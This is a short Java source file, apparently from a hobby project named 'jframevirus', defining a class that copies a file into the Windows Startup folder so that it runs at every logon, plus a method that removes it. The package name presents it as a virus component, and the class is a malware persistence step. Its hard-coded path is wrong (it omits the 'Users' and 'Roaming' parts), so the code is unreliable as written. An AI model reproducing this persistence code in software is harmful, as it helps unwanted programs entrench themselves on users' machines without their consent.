package com.joo.jframevirus.autostart;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;

public class WinAutoStartUnit extends AbstractAutoStartUnit {
    public WinAutoStartUnit() {
        super("C:\\" + System.getProperty("user.name") +
                "\\AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    }

    @Override
    public void addToAutoStart() {
        try {
            FileUtils.copyFile(new File(super.getAutoStartFileName()),
                    new File(super.getAutoStartFilePath()));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void removeFromAutoStart() {
        new File(super.getAutoStartFilePath()).delete();
    }
}
